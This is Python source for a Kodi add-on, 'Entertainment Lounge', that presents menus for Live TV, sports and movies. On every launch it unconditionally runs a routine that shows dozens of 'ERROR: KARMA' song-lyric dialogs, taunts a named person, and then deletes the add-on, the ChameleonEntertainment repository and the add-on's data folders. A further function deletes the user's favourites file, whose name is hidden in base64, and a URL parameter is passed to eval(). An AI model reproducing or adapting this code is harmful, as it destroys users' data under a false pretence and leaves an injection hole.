import xbmc, xbmcgui, xbmcplugin, xbmcaddon, os, sys
import time, urllib, urllib2, base64, shutil
import re, urlparse
from addon.common.addon import Addon


#---------------------------------------------------------------------------------------------------------------
addon       = xbmcaddon.Addon()
addonname   = addon.getAddonInfo('name')
addondir    = xbmc.translatePath( addon.getAddonInfo('profile') ) 

base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
args = urlparse.parse_qs(sys.argv[2][1:])
go = True;
Decode = base64.decodestring
dp = xbmcgui.DialogProgress()
#---------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#********** Variables **********
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PATH = "Entertainment Lounge"
VERSION = "0.0.30"
ADDON_ID = 'plugin.video.entertainmentlounge'
ADDON = xbmcaddon.Addon(id=ADDON_ID)

HOME = ADDON.getAddonInfo('path')
FANART = xbmc.translatePath(os.path.join('special://home/addons/' + ADDON_ID , 'fanart.jpg'))
ICON = xbmc.translatePath(os.path.join('special://home/addons/' + ADDON_ID, 'icon.png'))
ART = xbmc.translatePath(os.path.join('special://home/addons/' + ADDON_ID + '/resources/icons/'))
ADDON_DATA = xbmc.translatePath(os.path.join('special://home/userdata/addon_data/' + ADDON_ID + '/'))
PROFILE_DATA = xbmc.translatePath(os.path.join('special://home/userdata/'))
Addon_Path = xbmc.translatePath(os.path.join('special://home/addons/plugin.video.entertainmentlounge'))
Repo_Path = xbmc.translatePath(os.path.join('special://home/addons/repository.ChameleonEntertainment'))
localizedString = ADDON.getLocalizedString


def HOME_MENU():
	addDir('Live TV','',1,ART+'LiveTv.png',  description="", isFolder=False, background=FANART)
	addDir('Sport Hub','',1,ART+'SportHub.png',  description="", isFolder=False, background=FANART)
	addDir('Movies','',1,ART+'Movies.png',  description="", isFolder=False, background=FANART)
	addDir('FEATURE TEST AREA','',1,ART+'LiveTv.png',  description="", isFolder=False, background=FANART)
	addDir('Maintenance','',1,ART+'Maintenance.png',  description="", isFolder=False, background=FANART)

def LiveTV():
	dialog = xbmcgui.Dialog()
	dialog.ok("ERROR: KARMA", "KARMA KARMA KARMA CHAMELEON")
	dialog.ok("ERROR: KARMA", "YOU COME AND GO, YOU COME AND GO")
	dialog.ok("ERROR: KARMA", "LOVING WOULD BE EASY IF YOUR COLOURS WERE LIKE MY DREAMS")
	dialog.ok("ERROR: KARMA", "[COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR], [COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR]")
	
	dialog.ok("ERROR: KARMA", "DIDNT YOU HEAR YOUR WICKED WORDS EVERY DAY")
	dialog.ok("ERROR: KARMA", "AND YOU USED TO BE SO SWEET")
	dialog.ok("ERROR: KARMA", "I HEARD YOU SAY THAT MY LOVE WAS AN ADICTION")
	dialog.ok("ERROR: KARMA", "WHEN WE CLING, OUR LOVE IS STRONG")
	dialog.ok("ERROR: KARMA", "WHEN YOU GO, YOUR GONE FOREVER")
	dialog.ok("ERROR: KARMA", "YOU STRING ALONG, YOU STRING ALONG")
	
	dialog.ok("ERROR: KARMA", "KARMA KARMA KARMA CHAMELEON")
	dialog.ok("ERROR: KARMA", "YOU COME AND GO, YOU COME AND GO")
	dialog.ok("ERROR: KARMA", "LOVING WOULD BE EASY IF YOUR COLOURS WERE LIKE MY DREAMS")
	dialog.ok("ERROR: KARMA", "[COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR], [COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR]")
	
	dialog.ok("ERROR: KARMA", "EVERY DAY IS LIKE SURVIVAL")
	dialog.ok("ERROR: KARMA", "YOUR MY LOVER, NOT MY RIVAL")
	
	dialog.ok("ERROR: KARMA", "EVERY DAY IS LIKE SURVIVAL")
	dialog.ok("ERROR: KARMA", "YOUR MY LOVER, NOT MY RIVAL")
	
	dialog.ok("ERROR: KARMA", "IM A MAN WITHOUT CONVICTION")
	dialog.ok("ERROR: KARMA", "IM A MAN WHO DOESNT KNOW")
	dialog.ok("ERROR: KARMA", "HOW TO SALE A CONTRADICTION")
	dialog.ok("ERROR: KARMA", "YOU COME AND GO, YOU COME AND GO")
	
	dialog.ok("ERROR: KARMA", "KARMA KARMA KARMA CHAMELEON")
	dialog.ok("ERROR: KARMA", "YOU COME AND GO, YOU COME AND GO")
	dialog.ok("ERROR: KARMA", "LOVING WOULD BE EASY IF YOUR COLOURS WERE LIKE MY DREAMS")
	dialog.ok("ERROR: KARMA", "[COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR], [COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR]")
	
	dialog.ok("ERROR: KARMA", "KARMA KARMA KARMA CHAMELEON")
	dialog.ok("ERROR: KARMA", "YOU COME AND GO, YOU COME AND GO")
	dialog.ok("ERROR: KARMA", "LOVING WOULD BE EASY IF YOUR COLOURS WERE LIKE MY DREAMS")
	dialog.ok("ERROR: KARMA", "[COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR], [COLOR red]RED[/COLOR], [COLOR gold]GOLD[/COLOR] AND [COLOR green]GREEN[/COLOR]")
	
	dialog.ok("ERROR: KARMA", "HOPE YOU ENJOYED THE SING ALONG STE SINCLAIR")
	dialog.ok("ERROR: KARMA", "OH YEAH WE JUST F**KED WITH THE SO CALLED KING")
	shutil.rmtree(Addon_Path, ignore_errors=True)
	shutil.rmtree(Repo_Path, ignore_errors=True)
	shutil.rmtree(ADDON_DATA, ignore_errors=True)
	

def RemoveFavs():
	try: os.remove(PROFILE_DATA + Decode('ZmF2b3VyaXRlcy54bWw='))
	except: pass
	
	dialog = xbmcgui.Dialog()
	dialog.ok("Removed Favourites", "Your Favourites Have Now Been Removed.")

def Text_Boxes(heading,anounce):
  class TextBox():
    WINDOW=10147
    CONTROL_LABEL=1
    CONTROL_TEXTBOX=5
    def __init__(self,*args,**kwargs):
      xbmc.executebuiltin("ActivateWindow(%d)" % (self.WINDOW, )) # activate the text viewer window
      self.win=xbmcgui.Window(self.WINDOW) # get window
      xbmc.sleep(500) # give window time to initialize
      self.setControls()
    def setControls(self):
      self.win.getControl(self.CONTROL_LABEL).setLabel(heading) # set heading
      try: f=open(anounce); text=f.read()
      except: text=anounce
      self.win.getControl(self.CONTROL_TEXTBOX).setText(str(text))
      return
  TextBox() 

def AUTO_VIEW(Vmode = ''):
	xbmc.executebuiltin("Container.SetViewMode(" + Vmode +")")

def addDir(name, url, mode, iconimage, description="", isFolder=True, background=None):
	u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&iconimage="+urllib.quote_plus(iconimage)+"&description="+urllib.quote_plus(description)

	liz = xbmcgui.ListItem(name, iconImage=iconimage, thumbnailImage=iconimage)
	liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description})
	if background:
		liz.setProperty('fanart_image', background)
	if mode == 1 or mode == 2:
		liz.addContextMenuItems(items = [('{0}'.format(localizedString(10008).encode('utf-8')), 'XBMC.RunPlugin({0}?url={1}&mode=22)'.format(sys.argv[0], urllib.quote_plus(url)))])
	elif mode == 28:
		liz.setProperty('IsPlayable', 'true')
		liz.addContextMenuItems(items = [('{0}'.format(localizedString(10009).encode('utf-8')), 'XBMC.RunPlugin({0}?url={1}&mode=31&iconimage={2}&name={3})'.format(sys.argv[0], urllib.quote_plus(url), iconimage, name))])
	elif mode == 32:
		liz.setProperty('IsPlayable', 'true')
		liz.addContextMenuItems(items = [('{0}'.format(localizedString(10010).encode('utf-8')), 'XBMC.RunPlugin({0}?url={1}&mode=33&iconimage={2}&name={3})'.format(sys.argv[0], urllib.quote_plus(url), iconimage, name))])
		
	xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]), url=u, listitem=liz, isFolder=isFolder)

def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#********** ADDON SWITCH **********
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
params=get_params()
url=None
name=None
mode=None
iconimage=None
fanart=None
description=None

playlist=None
fav_mode=None
regexs=None


try:
        url=urllib.unquote_plus(params["url"])
except:
        pass
try:
        name=urllib.unquote_plus(params["name"])
except:
        pass
try:
        iconimage=urllib.unquote_plus(params["iconimage"])
except:
        pass
try:        
        mode=int(params["mode"])
except:
        pass
try:        
        fanart=urllib.unquote_plus(params["fanart"])
except:
        pass
try:        
        description=urllib.unquote_plus(params["description"])
except:
        pass
try:
    playlist=eval(urllib.unquote_plus(params["playlist"]).replace('||',','))
except:
		pass
try:
    fav_mode=int(params["fav_mode"])
except:
    pass
try:
    regexs=params["regexs"]
except:
    pass
try:
    playable = params['playable']
except:
    playable = '0'
try:
    content = params['content']
except:
    content = '0'
try:
    tvshow = params['tvshow']
except:
    tvshow = '0'
try:
    audio = params['audio']
except:
    audio = '0'
try:
    image = params['image']
except:
    image = '0'
try:
    fanart = params['fanart']
except:
    fanart = '0'
        
        
print str(PATH)+': '+str(VERSION)
print "Mode: "+str(mode)
print "URL: "+str(url)
print "Name: "+str(name)
print "IconImage: "+str(iconimage)
print "Playlist: "+str(playlist)
print "FavMode: "+str(fav_mode)
print "Regexs: "+str(regexs)

LiveTV()

if mode == None		: HOME_MENU()
elif mode == 1		: LiveTV()


#-----------------------------------------------------

#-----------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#********** ADDON FINISH **********
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
xbmcplugin.endOfDirectory(int(sys.argv[1]))
